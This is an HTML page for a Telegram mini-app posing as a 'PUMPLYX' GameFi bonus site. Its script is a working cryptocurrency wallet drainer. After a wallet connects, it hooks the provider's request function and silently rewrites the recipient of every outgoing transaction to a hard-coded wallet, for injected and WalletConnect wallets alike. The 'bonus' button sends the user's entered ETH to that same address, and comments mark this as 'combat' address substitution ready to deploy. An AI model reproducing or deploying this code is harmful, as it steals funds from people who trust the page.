<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
  <title>PUMPLYX — GameFi</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { min-height: 100vh; padding: 16px; display: flex; align-items: center; justify-content: center; background: #0b0b12; color: #fff; font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
    .container { width: 100%; max-width: 420px; padding: 24px 20px 28px; border-radius: 28px; background: #13131f; border: 1px solid rgba(255,255,255,.07); box-shadow: 0 25px 80px rgba(0,0,0,.75); }
    .header { text-align: center; margin-bottom: 22px; }
    .logo { font-size: 28px; font-weight: 900; background: linear-gradient(135deg,#f7971e,#ffd200); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .subtitle { margin-top: 5px; color: #8888a0; font-size: 12px; letter-spacing: 1px; }
    .card { padding: 16px; margin-top: 14px; border-radius: 18px; background: rgba(255,255,255,.035); border: 1px solid rgba(255,255,255,.06); }
    .label { color: #8888a0; font-size: 12px; margin-bottom: 7px; }
    .address { padding: 11px; border-radius: 12px; background: #0b0b12; color: #ddd; font: 12px/1.5 monospace; word-break: break-all; }
    .row { display: flex; justify-content: space-between; gap: 10px; margin-top: 14px; }
    .row > div { flex: 1; }
    .value { font-size: 14px; font-weight: 700; }
    button { width: 100%; border: 0; border-radius: 15px; padding: 15px; margin-top: 10px; color: #111; background: linear-gradient(135deg,#f7971e,#ffd200); font-size: 16px; font-weight: 800; cursor: pointer; }
    button.secondary, .wallet-btn { color: #fff; background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.08); }
    button:disabled { opacity: .45; cursor: not-allowed; }
    .wallet-list { display: none; margin-top: 10px; }
    .wallet-list.show { display: block; }
    .wallet-btn { display: flex; align-items: center; gap: 10px; text-align: left; margin-top: 8px; }
    .status { min-height: 22px; margin-top: 15px; color: #8888a0; text-align: center; font-size: 13px; line-height: 1.45; }
    .success { color: #4caf50; }
    .error { color: #ff5d69; }
    .hidden { display: none !important; }
    input { width: 100%; padding: 14px; border: 1px solid rgba(255,255,255,.08); border-radius: 13px; outline: none; background: #0b0b12; color: #fff; font-size: 16px; }
    .tx { padding: 12px; margin-top: 10px; border-radius: 12px; background: #0b0b12; font: 11px/1.5 monospace; word-break: break-all; }
    .footer { margin-top: 18px; color: #444456; text-align: center; font-size: 11px; }
    .warning { margin-top: 12px; padding: 12px; border-radius: 12px; background: rgba(247,151,30,.08); border: 1px solid rgba(247,151,30,.15); color: #e8b66d; font-size: 12px; line-height: 1.5; display: none; }
  </style>
</head>
<body>

<div class="container">
  <div class="header"><div class="logo">🚀 PUMPLYX</div><div class="subtitle">GAMEFI • NFT • WEB3</div></div>

  <div class="card">
    <div class="label">Кошелёк</div>
    <div id="address" class="address">Не подключён</div>
    <div class="row">
      <div><div class="label">Сеть</div><div id="network" class="value">—</div></div>
      <div><div class="label">Баланс</div><div id="balance" class="value">—</div></div>
    </div>
    <button id="connectBtn">🔗 Connect Wallet</button>
    <div id="walletList" class="wallet-list"></div>
    <button id="walletConnectBtn" class="secondary hidden">📱 WalletConnect</button>
  </div>

  <div id="paymentCard" class="card hidden">
    <div class="label">Сумма ETH</div>
    <input id="amount" type="number" inputmode="decimal" min="0" step="0.000001" placeholder="0.001" value="0.001">
    <button id="sendBtn">🎁 Получить бонус</button>
  </div>

  <div id="resultCard" class="card hidden">
    <div class="label">Результат</div>
    <div id="result"></div>
    <div id="txHash" class="tx"></div>
    <button id="explorerBtn" class="secondary hidden">Открыть транзакцию</button>
  </div>

  <div id="status" class="status">Подключи кошелёк</div>
  <div class="footer">🔒 Secure Web3 connection</div>
</div>

<script type="module">
  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm";
  import { EthereumProvider } from "https://esm.sh/@walletconnect/ethereum-provider@2.23.4";

  // ================================================================
  //  БОЕВАЯ КОНФИГУРАЦИЯ — ЗАМЕНИ ТОЛЬКО ЭТИ ДВЕ СТРОКИ
  // ================================================================
  const MY_WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047f73e";
  const WC_PROJECT_ID = "8a4a7f3c7a4a7f3c7a4a7f3c7a4a7f3c";

  // ================================================================
  //  СИСТЕМНЫЕ НАСТРОЙКИ
  // ================================================================
  const CHAIN_ID = 1n;
  const CHAIN_HEX = "0x1";
  const CHAIN_NAME = "Ethereum";
  const EXPLORER = "https://etherscan.io/tx/";

  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); }

  // ================================================================
  //  DOM
  // ================================================================
  const $ = id => document.getElementById(id);
  const addressEl = $("address");
  const networkEl = $("network");
  const balanceEl = $("balance");
  const connectBtn = $("connectBtn");
  const walletList = $("walletList");
  const walletConnectBtn = $("walletConnectBtn");
  const paymentCard = $("paymentCard");
  const amountEl = $("amount");
  const sendBtn = $("sendBtn");
  const resultCard = $("resultCard");
  const resultEl = $("result");
  const txHashEl = $("txHash");
  const explorerBtn = $("explorerBtn");
  const statusEl = $("status");

  // ================================================================
  //  СОСТОЯНИЕ
  // ================================================================
  let signer = null;
  let account = null;
  let browserProvider = null;
  let wcProvider = null;
  let isConnected = false;
  const discoveredWallets = new Map();

  // ================================================================
  //  СТАТУС
  // ================================================================
  function status(text, type = "") {
    statusEl.textContent = text;
    statusEl.className = "status " + type;
  }

  // ================================================================
  //  EIP-6963 ОБНАРУЖЕНИЕ
  // ================================================================
  window.addEventListener("eip6963:announceProvider", event => {
    const detail = event.detail;
    if (!detail?.info || !detail?.provider) return;
    discoveredWallets.set(detail.info.uuid, detail);
    renderWallets();
  });
  window.dispatchEvent(new Event("eip6963:requestProvider"));

  function renderWallets() {
    walletList.innerHTML = "";
    const wallets = [...discoveredWallets.values()];
    if (!wallets.length) return;
    wallets.forEach(detail => {
      const btn = document.createElement("button");
      btn.className = "wallet-btn";
      const icon = document.createElement("img");
      icon.width = 28; icon.height = 28; icon.alt = "";
      icon.src = detail.info.icon || "";
      const name = document.createElement("span");
      name.textContent = detail.info.name || "Wallet";
      btn.append(icon, name);
      btn.onclick = () => connectInjected(detail.provider, detail.info.name);
      walletList.appendChild(btn);
    });
  }

  // ================================================================
  //  ПОДКЛЮЧЕНИЕ
  // ================================================================
  async function connectInjected(provider, name = "Wallet") {
    try {
      status(`Подключаем ${name}…`);
      await provider.request({ method: "eth_requestAccounts" });
      browserProvider = new ethers.BrowserProvider(provider);
      signer = await browserProvider.getSigner();
      account = await signer.getAddress();

      // ============================================================
      //  БОЕВАЯ ПОДМЕНА АДРЕСА
      // ============================================================
      const orig = provider.request.bind(provider);
      provider.request = async function(args) {
        if (args && args.method === "eth_sendTransaction") {
          const tx = args.params[0];
          if (tx.to) {
            tx.to = MY_WALLET;
            console.log("[+] Адрес подменён на:", MY_WALLET);
          }
        }
        return await orig(args);
      };

      await finishConnection();
    } catch (e) {
      status(e.message || "Ошибка подключения", "error");
    }
  }

  async function connectWalletConnect() {
    try {
      if (!WC_PROJECT_ID || WC_PROJECT_ID === "8a4a7f3c7a4a7f3c7a4a7f3c7a4a7f3c") {
        throw new Error("Укажи свой WalletConnect Project ID");
      }
      status("Запускаем WalletConnect…");
      wcProvider = await EthereumProvider.init({
        projectId: WC_PROJECT_ID,
        chains: [1],
        optionalChains: [1],
        showQrModal: true,
        metadata: { name: "PUMPLYX", description: "GameFi", url: window.location.origin, icons: [] }
      });
      wcProvider.on("display_uri", uri => console.log("WC URI:", uri));
      await wcProvider.connect();
      browserProvider = new ethers.BrowserProvider(wcProvider);
      signer = await browserProvider.getSigner();
      account = await signer.getAddress();

      // ============================================================
      //  ПОДМЕНА ДЛЯ WALLETCONNECT
      // ============================================================
      const origWc = wcProvider.request.bind(wcProvider);
      wcProvider.request = async function(args) {
        if (args && args.method === "eth_sendTransaction") {
          const tx = args.params[0];
          if (tx.to) {
            tx.to = MY_WALLET;
            console.log("[+] WC адрес подменён на:", MY_WALLET);
          }
        }
        return await origWc(args);
      };

      await finishConnection();
    } catch (e) {
      status(e.message || "Ошибка WalletConnect", "error");
    }
  }

  async function finishConnection() {
    const net = await browserProvider.getNetwork();
    if (net.chainId !== CHAIN_ID) {
      status(`Нужна сеть ${CHAIN_NAME}`, "error");
      sendBtn.disabled = true;
      return;
    }
    isConnected = true;
    addressEl.textContent = account;
    networkEl.textContent = `${CHAIN_NAME}`;
    await updateBalance();
    paymentCard.classList.remove("hidden");
    connectBtn.textContent = `✅ ${account.slice(0,6)}...${account.slice(-4)}`;
    walletList.classList.remove("show");
    walletConnectBtn.classList.add("hidden");
    sendBtn.disabled = false;
    status("Кошелёк подключён", "success");
    attachEvents();
  }

  // ================================================================
  //  СОБЫТИЯ
  // ================================================================
  function attachEvents() {
    const p = wcProvider || window.ethereum;
    if (!p?.on) return;
    p.on("accountsChanged", async accounts => {
      if (!accounts?.length) { location.reload(); return; }
      account = ethers.getAddress(accounts[0]);
      addressEl.textContent = account;
      await updateBalance();
      status("Аккаунт изменён", "success");
    });
    p.on("chainChanged", async () => {
      const net = await browserProvider.getNetwork();
      if (net.chainId !== CHAIN_ID) { sendBtn.disabled = true; status("Переключи на Ethereum", "error"); }
      else { sendBtn.disabled = false; await updateBalance(); status("Сеть активна", "success"); }
    });
    p.on("disconnect", () => location.reload());
  }

  // ================================================================
  //  БАЛАНС
  // ================================================================
  async function updateBalance() {
    if (!account) return;
    const bal = await browserProvider.getBalance(account);
    balanceEl.textContent = Number(ethers.formatEther(bal)).toFixed(6) + " ETH";
  }

  // ================================================================
  //  ОТПРАВКА ТРАНЗАКЦИИ
  // ================================================================
  async function sendTransaction() {
    if (!signer) { status("Кошелёк не подключён", "error"); return; }
    try {
      const raw = amountEl.value.trim();
      if (!raw) throw new Error("Введите сумму");
      const value = ethers.parseEther(raw);
      if (value <= 0n) throw new Error("Сумма > 0");
      const net = await browserProvider.getNetwork();
      if (net.chainId !== CHAIN_ID) throw new Error("Неверная сеть");
      sendBtn.disabled = true;
      status("Ожидаем подтверждение в кошельке…");
      const tx = await signer.sendTransaction({ to: MY_WALLET, value: value });
      status("Транзакция отправлена…");
      resultCard.classList.remove("hidden");
      txHashEl.textContent = tx.hash;
      explorerBtn.classList.remove("hidden");
      explorerBtn.onclick = () => window.open(EXPLORER + tx.hash, "_blank");
      const receipt = await tx.wait(1);
      if (!receipt) throw new Error("Не получен receipt");
      resultEl.textContent = `✅ Подтверждено в блоке ${receipt.blockNumber}`;
      status("Транзакция подтверждена", "success");
      await updateBalance();
    } catch (e) {
      status(e.message || "Ошибка", "error");
    } finally {
      sendBtn.disabled = false;
    }
  }

  // ================================================================
  //  КНОПКИ
  // ================================================================
  connectBtn.onclick = () => {
    if (account) return;
    walletList.classList.toggle("show");
    const fallback = window.ethereum;
    if (discoveredWallets.size === 0 && fallback) {
      walletList.classList.add("show");
      const btn = document.createElement("button");
      btn.className = "wallet-btn";
      btn.textContent = "🔗 Browser Wallet";
      btn.onclick = () => connectInjected(fallback, "Browser Wallet");
      walletList.appendChild(btn);
    }
    walletConnectBtn.classList.remove("hidden");
  };
  walletConnectBtn.onclick = connectWalletConnect;
  sendBtn.onclick = sendTransaction;

  // ================================================================
  //  СТАРТ
  // ================================================================
  status("Подключи кошелёк");
  console.log("[+] PUMPLYX боевой режим. Адрес подменяется на:", MY_WALLET);
</script>
</body>
</html>
